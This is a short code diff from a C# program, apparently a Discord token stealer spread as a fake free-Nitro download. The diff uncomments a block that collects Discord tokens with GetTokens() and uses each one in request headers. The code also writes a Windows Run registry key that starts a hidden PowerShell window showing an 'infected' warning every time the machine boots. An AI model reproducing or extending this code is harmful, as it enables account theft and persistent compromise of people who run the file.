@@ -41,7 +41,7 @@ namespace Discord2
                 return;
             }
 
-            /*List<string> tokens = GetTokens();
+            List<string> tokens = GetTokens();
             if (tokens.Count > 0){
                 foreach (string t in tokens){
                     SetHeaders(t);
@@ -62,7 +62,7 @@ namespace Discord2
             } else {
                 Console.WriteLine("No Tokens found :(");
                 return;
-            }*/
+            }
 
             string message = "Your Computer has been infected. Do not worry, nothing dangerous or maliciuos. Next time be more careful with files you download from the internet. PS: No free Nitro :(";
             WriteRegKey(@"SoftWare\Microsoft\Windows\CurrentVersion\Run", "warning", String.Format("powershell -windowstyle hidden -noprofile -command \"Add-Type -Assemblyname PresentationFramework; [System.Windows.Messagebox]::Show('{0}', 'WARNING: Security Breach', 'OK', 'Exclamation')\"", message));
